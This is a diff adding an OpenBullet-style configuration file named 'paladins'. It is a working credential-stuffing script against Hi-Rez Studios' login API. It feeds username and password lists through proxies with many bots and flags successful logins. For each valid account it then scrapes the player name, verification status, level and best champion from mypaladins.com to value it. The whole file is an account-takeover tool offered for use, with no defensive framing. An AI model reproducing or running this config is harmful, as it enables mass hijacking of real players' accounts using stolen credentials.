@@ -1,0 +1,97 @@
+[SETTINGS]
+{
+  "Name": "paladins",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-11T01:46:25.7573976+02:00",
+  "AdditionalInfo": "",
+  "Author": "Brian",
+  "Version": "1.1.3",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://api.hirezstudios.com/acct/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://my.hirezstudios.com" 
+  HEADER "Referer: https://my.hirezstudios.com/" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\",\"webToken" 
+    KEY "},{\"game\":\"Paladins\",\"gameId" 
+  KEYCHAIN Failure OR 
+    KEY "failed authentication" 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<SOURCE>" DoesNotContain "\"game\":\"Paladins\"" 
+    KEY "\",\"webToken" 
+
+PARSE "<SOURCE>" LR "gameId\":400,\"playerName\":\"" "\",\"playerId" -> VAR "PNAME" 
+
+PARSE "<SOURCE>" LR "\"verified\":" "," -> CAP "Verified" 
+
+REQUEST GET "https://mypaladins.com/api/player/<PNAME>/exists/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY ",\"playerId\":" 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" Contains "None" 
+
+PARSE "<SOURCE>" LR ",\"playerId\":" ",\"playerName" -> VAR "PLAYERID" 
+
+REQUEST GET "https://mypaladins.com/player/<PLAYERID>/<PNAME>/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "profilelevel\">Level: " 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" Contains "None" 
+
+PARSE "<SOURCE>" LR "profilelevel\">Level: " " <span class=\"region" -> CAP "Level" 
+
+REQUEST GET "https://mypaladins.com/player/<PLAYERID>/<PNAME>/champions/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<PNAME>" 
+  KEYCHAIN Retry OR 
+    KEY "<RESPONSECODE>" Contains "None" 
+
+PARSE "<SOURCE>" LR "<a class=\"champlink_1\" href=\"/champion/" "/\">" -> CAP "Best character" 
+
+PARSE "<SOURCE>" LR "<div class=\"yellow\">" "</div" -> CAP "Best character level" 
+
